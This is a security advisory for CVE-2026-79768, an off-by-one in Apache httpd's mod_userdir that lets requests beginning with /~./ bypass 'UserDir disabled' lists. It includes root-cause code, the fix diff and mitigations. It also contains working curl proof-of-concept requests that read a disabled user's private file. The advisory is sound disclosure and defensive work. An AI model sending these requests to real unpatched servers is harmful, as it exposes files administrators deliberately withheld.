# Apache HTTP Server: mod_userdir Off-by-One in Username Check leads to `UserDir disabled` Bypass and Information Disclosure

- **Advisory ID:** MCSAID-2026-008
- **CVE ID:** [CVE-2026-79768](https://www.cve.org/CVERecord?id=CVE-2026-79768)
- **Reported:** 2026-08-14
- **Published:** 2026-10-13
- **Severity:** Medium (CVSS 5.3 – CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)
- **Vulnerability type:** Access control bypass, Information disclosure
- **Current state:** Fix released by vendor in Apache HTTP Server 2.4.69
- **Exploitation:** Easy, deterministic, single unauthenticated request, not seen in the wild
- **Software:** [Apache HTTP Server](https://httpd.apache.org/)
- **CWE:** [CWE-55: Path Equivalence: '/./' (Single Dot Directory)](https://cwe.mitre.org/data/definitions/55.html), [CWE-180: Incorrect Behavior Order: Validate Before Canonicalize](https://cwe.mitre.org/data/definitions/180.html), [CWE-863: Incorrect Authorization](https://cwe.mitre.org/data/definitions/863.html)
- **Discovered by:** Vlatko Kosturjak of Marlink Cyber

---

## Summary

The special-name filter in `translate_userdir()` in `mod_userdir` is indexed one byte too far. It tests `user[1]` where it should test `user[0]`, so the username `"."` is never rejected. With an absolute, non-wildcard `UserDir` base, a request for `/~./` canonicalises to the base directory itself, which lets an unauthenticated client:

1. read content belonging to users excluded by `UserDir disabled <user>`, and
2. reach the `UserDir` base directory itself, which is not a user directory and is not intended to be served through the `/~user/` namespace.

The check also has a false-positive side effect: legitimate usernames of the form `X.` and `X..` (e.g. `a.`) are wrongly declined, because those *do* have `.` at index 1.

---

## Affected Versions

| Version | Status |
|---------|--------|
| Apache HTTP Server 2.4.0 through 2.4.68 | Vulnerable |
| Apache HTTP Server 2.4.69 and later | Fixed |

Also verified on the 2.4.x branch @ `8a394acb46` (2026-08-13, pre-fix) and trunk @ `4c1d84e3c1` (version 2.5.1). Verified on Apache httpd 2.4.68 built from source, event MPM, Linux x86-64, Ubuntu 24.04 LTS.

### Affected configuration

```apache
UserDir /srv/userdirs        # absolute, no '*' - the affected form
UserDir disabled alice       # the directive/control that is bypassed
```

An absolute, non-wildcard `UserDir` path combined with a `UserDir disabled <user>` list is the affected shape. This is the second form of the `UserDir` directive described in the [mod_userdir documentation](https://httpd.apache.org/docs/2.4/mod/mod_userdir.html#userdir). `mod_userdir` is not loaded by default in most distributions, which together with the configuration requirement limits the severity.

---

## Impact

**Confidentiality.** An unauthenticated client reads content under the `UserDir` base that the administrator explicitly excluded from the `/~user/` namespace:

- the directory of every user named in a `UserDir disabled <user> ...` list;
- the base directory itself and anything else beneath it that is not a user directory.

**Integrity** is impacted only insofar as a writable handler (e.g. DAV) is configured beneath the base.

### Scope limits

- **`UserDir disabled` + `UserDir enabled <list>` is NOT affected.** That form goes through a *positive* allowlist test (`mod_userdir.c:253-256`):

  ```c
      if (s_cfg->globally_disabled == O_DISABLE
          && apr_table_get(s_cfg->enabled_users, user) == NULL) {
          return DECLINED;
      }
  ```

  `"."` is absent from `enabled_users`, so it is declined like any other unlisted name. Verified: `GET /~./alice/secret.txt` returns 404 under this configuration.

- **The wildcard form leaks less.** With `UserDir /srv/home/*/public_html`, the wildcard branch (`:288-290`) builds `prefix + user + userdir`, so `"."` yields `/srv/home/./public_html` = `/srv/home/public_html`. Verified: `GET /~./` reaches that directory (200) - escaping the intended `/~user/` pattern and exposing a directory belonging to no user - but `GET /~./alice/secret.txt` returns 404, i.e. another user's directory is *not* reachable. The absolute non-wildcard form is the one that yields the full bypass.

---

## Exploitation

No credentials, no timing, no race - a single GET request. Prefixing the path with `/~./` bypasses the `UserDir disabled` list:

```
# baseline: the policy works for ordinary names
curl -i http://127.0.0.1:8081/~alice/secret.txt      # 404  (UserDir disabled alice)
curl -i http://127.0.0.1:8081/~carol/                # 200  (normal user)
curl -i http://127.0.0.1:8081/~../                   # 404
curl -i http://127.0.0.1:8081/~.../                  # 404

# the bypass
curl -i http://127.0.0.1:8081/~./alice/secret.txt    # 200 + ALICE PRIVATE DATA
curl -i http://127.0.0.1:8081/~./README.txt          # 200 - base dir, belongs to no user
curl -i http://127.0.0.1:8081/~./                    # 200 - base dir listing

# the off-by-one's other direction
curl -i http://127.0.0.1:8081/~a./                   # 404 - legitimate name wrongly declined
```

### Reproduction

Config (complete, minus `LoadModule` lines):

```apache
Listen 127.0.0.1:8081
DocumentRoot "/srv/htdocs"

UserDir "/srv/userdirs"
UserDir disabled alice
<Directory "/srv/userdirs">
    Require all granted
    Options +Indexes
</Directory>
```

Layout:

```
/srv/userdirs/README.txt          "TOP LEVEL MARKER"        (base dir, not a user dir)
/srv/userdirs/alice/secret.txt    "ALICE PRIVATE DATA ..."  (alice is disabled)
/srv/userdirs/carol/index.html    "carol public"            (carol is enabled)
```

Result:

```
$ curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8081/~alice/secret.txt
404                                         <-- correct: UserDir disabled alice

$ curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8081/~carol/
200                                         <-- correct: enabled user

$ curl -s http://127.0.0.1:8081/~./alice/secret.txt
ALICE PRIVATE DATA (userdir disabled for alice)      <-- BYPASS, HTTP 200

$ curl -s http://127.0.0.1:8081/~./README.txt
TOP LEVEL MARKER                                     <-- base directory exposed, HTTP 200

$ curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8081/~../
404                                         <-- ".." is (accidentally) rejected
$ curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8081/~.../
404
```

---

## Details

### Affected code

- **File:** `modules/mappers/mod_userdir.c`
- **Function:** `translate_userdir()`
- **Lines:** `238-242`

```c
    /*
     * If there's no username, it's not for us.  Ignore . and .. as well.
     */
    if (user[0] == '\0' ||
        (user[1] == '.' && (user[2] == '\0' ||
                            (user[2] == '.' && user[3] == '\0')))) {
        return DECLINED;
    }
```

### Root cause

The comment states the intent - ignore `.` and `..` - but the indices are shifted by one:

| `user` | `user[1] == '.'` | Result | Intended |
| --- | --- | --- | --- |
| `"."` | `user[1]` is `'\0'` → false | **accepted** | rejected |
| `".."` | true, `user[2] == '\0'` | rejected | rejected (matched only by accident) |
| `"..."` | true, `user[2]=='.'`, `user[3]=='\0'` | rejected | accepted |
| `"a."` | true, `user[2] == '\0'` | **wrongly rejected** | accepted |
| `"a.."` | true | **wrongly rejected** | accepted |

`"."` therefore reaches the policy checks that follow, which are purely lexical string lookups against the supplied name:

```c
    if (apr_table_get(s_cfg->disabled_users, user) != NULL) {   /* :245 */
        return DECLINED;
    }
```

`"."` is not in `disabled_users`, so it passes. The absolute-base branch then concatenates it directly:

```c
            else
                filename = apr_pstrcat(r->pool, userdir, "/", user, NULL);   /* :295-296 */
...
            r->filename = apr_pstrcat(r->pool, filename, dname, NULL);       /* :325 */
```

For `GET /~./alice/secret.txt` this yields `/srv/userdirs/.` + `/alice/secret.txt`, which the filesystem resolves to `/srv/userdirs/alice/secret.txt` - the exact path the `UserDir disabled alice` policy was meant to make unreachable. The policy is applied to the *lexical* username before the path is canonicalised, so a path-equivalent name defeats it.

---

## Indicators

**On network / in access logs:**

- Requests whose path begins with `/~./`, e.g. `GET /~./<user>/...` or `GET /~./`.

---

## Mitigations

The Apache HTTP Server security team fixed the issue in the 2.4.x branch in [r1938680](https://svn.apache.org/r1938680), released in Apache HTTP Server 2.4.69.

- Fixed release: Apache HTTP Server 2.4.69 - [httpd.apache.org/download.cgi](https://httpd.apache.org/download.cgi)

Proposed fix as originally reported - test index 0, which is what the comment describes:

```diff
--- a/modules/mappers/mod_userdir.c
+++ b/modules/mappers/mod_userdir.c
@@ -235,9 +235,9 @@
     /*
      * If there's no username, it's not for us.  Ignore . and .. as well.
      */
-    if (user[0] == '\0' ||
-        (user[1] == '.' && (user[2] == '\0' ||
-                            (user[2] == '.' && user[3] == '\0')))) {
+    if (user[0] == '\0' ||
+        (user[0] == '.' && (user[1] == '\0' ||
+                            (user[1] == '.' && user[2] == '\0')))) {
         return DECLINED;
     }
```

This both closes the bypass and stops declining legitimate `X.` / `X..` usernames.

Defence in depth, worth considering separately: reject any username containing a path separator or consisting solely of `.` characters, and apply `UserDir disabled` / `UserDir enabled` policy after canonicalisation rather than to the raw lexical name. The current ordering - lexical policy, then path construction - is what makes any path-equivalent name a policy bypass.

---

## Recommendations

- Upgrade Apache HTTP Server to 2.4.69 or later.
- If you cannot patch, switch from a disable-list (`UserDir disabled <user>`) to a global disable plus an explicit allowlist (`UserDir disabled` + `UserDir enabled <list>`), which is not affected.
- Alternatively, block request paths beginning with `/~./` (e.g. with `mod_rewrite` or a `<LocationMatch "^/~\./">` deny rule).
- Unload `mod_userdir` if per-user directories are not needed.

---

## Timeline

- 2026-08-14 – Vulnerability reported to the Apache HTTP Server security team
- 2026-10-01 – Fixed in the 2.4.x branch by r1938680
- 2026-10-01 – Apache HTTP Server 2.4.69 released
- 2026-10-13 – Public advisory released

---

## References

- CVE record: [CVE-2026-79768](https://www.cve.org/CVERecord?id=CVE-2026-79768)
- Fix commit: [r1938680](https://svn.apache.org/r1938680)
- Vendor security page: [Apache HTTP Server 2.4 vulnerabilities](https://httpd.apache.org/security/vulnerabilities_24.html)
- Marlink Cyber Security Advisory: [MCSAID-2026-008](https://github.com/marlinkcyber/advisories/blob/main/advisories/MCSAID-2026-008-apache-httpd-mod_userdir-userdir-disabled-bypass.md)
- Software: [Apache HTTP Server](https://httpd.apache.org/)
